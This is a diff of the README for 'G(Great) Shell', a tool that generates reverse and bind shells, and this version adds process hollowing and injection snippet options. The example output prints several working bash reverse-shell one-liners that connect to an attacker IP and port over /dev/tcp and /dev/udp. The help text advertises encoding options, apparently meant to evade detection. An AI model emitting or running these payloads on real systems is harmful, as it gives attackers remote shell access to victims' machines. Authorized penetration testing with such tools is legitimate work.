@@ -9,7 +9,7 @@ Name: G(Great) Shell
 
 Description: A cross-platform shell generator tool that lets you generate whichever shell you want, in any system you want, giving you full control and automation.
 
-**If you find this tool helpful, then please give me a ⭐ as it tells me that I should add more features to it.**
+**If you find this tool helpful, then please give me a ⭐ as it tells me that I should add more features to it. (THANKS)**
 
 Is cross-platform, you can use it in operating systems such as:
 
@@ -97,21 +97,19 @@ That's it, now you can add more.
 
 This is the help menu:
 
-```sh
-❯ python3 gshell.py --help
-usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b]
-                 [--base64] [--base32] [--base16] [--url] [--no-block] [--debug] [-l]
-                 [-a] [-h]
+```powershell
+PS C:\gshell> python .\gshell.py -h                                    
+usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b] [--hollowing] [--injector] [--base64] [--base32] [--base16] [--url] [--no-block] [-l] [-a] [-h]
 
- ██████  ███████ ██   ██ ███████ ██      ██      
-██       ██      ██   ██ ██      ██      ██      
-██   ███ ███████ ███████ █████   ██      ██      
-██    ██      ██ ██   ██ ██      ██      ██      
- ██████  ███████ ██   ██ ███████ ███████ ███████ 
+ ██████  ███████ ██   ██ ███████ ██      ██
+██       ██      ██   ██ ██      ██      ██
+██   ███ ███████ ███████ █████   ██      ██
+██    ██      ██ ██   ██ ██      ██      ██
+ ██████  ███████ ██   ██ ███████ ███████ ███████
 
 Generate bind shells and/or reverse shells with style
 
-            Version: 1.0
+            Version: 1.1
             Author: nozerobit
             Twitter: @nozerobit
 
@@ -126,6 +124,10 @@ Options:
 Payload Types:
   -r, --reverse         Victim communicates back to the attacking machine
   -b, --bind            Open up a listener on the victim machine
+
+Snippets Types:
+  --hollowing           Print process hollowing code snippets
+  --injector            Print process injector code snippets
 
 Encoding Options:
   --base64              Add base64 encoding
@@ -148,21 +150,29 @@ Help Options:
 Example, generate bash reverse shells:
 
 ```sh
-❯ python3 gshell.py -i 192.168.145.134 -p 444 -r -s bash
-[+] The IPv4 address: 192.168.145.134 is valid.
-[+] The port number: 444 is valid.
+PS C:\gshell> python .\gshell.py -i 192.168.111.120 -p 443  -r -s bash 
+[+] The IPv4 address: 192.168.111.120 is valid.
+[+] The port number: 443 is valid.
 [+] Shell type is valid
 [+] Preparing reverse shells
 [+] Generating bash shells
-bash -i >& /dev/tcp/192.168.145.134/444 0>&1
+bash -i >& /dev/tcp/192.168.111.120/443 0>&1
 
-0<&196;exec 196<>/dev/tcp/192.168.145.134/444; sh <&196 >&196 2>&196
+----------------NEXT CODE BLOCK----------------
 
-/bin/bash -l > /dev/tcp/192.168.145.134/444 0<&1 2>&1
+0<&196;exec 196<>/dev/tcp/192.168.111.120/443; sh <&196 >&196 2>&196
 
-bash -i >& /dev/tcp/192.168.145.134/444 0>&1
+----------------NEXT CODE BLOCK----------------
 
-bash -i >& /dev/udp/192.168.145.134/444 0>&1
+/bin/bash -l > /dev/tcp/192.168.111.120/443 0<&1 2>&1
+
+----------------NEXT CODE BLOCK----------------
+
+bash -i >& /dev/tcp/192.168.111.120/443 0>&1
+
+----------------NEXT CODE BLOCK----------------
+
+bash -i >& /dev/udp/192.168.111.120/443 0>&1
 ```
 
 # Installation in Linux
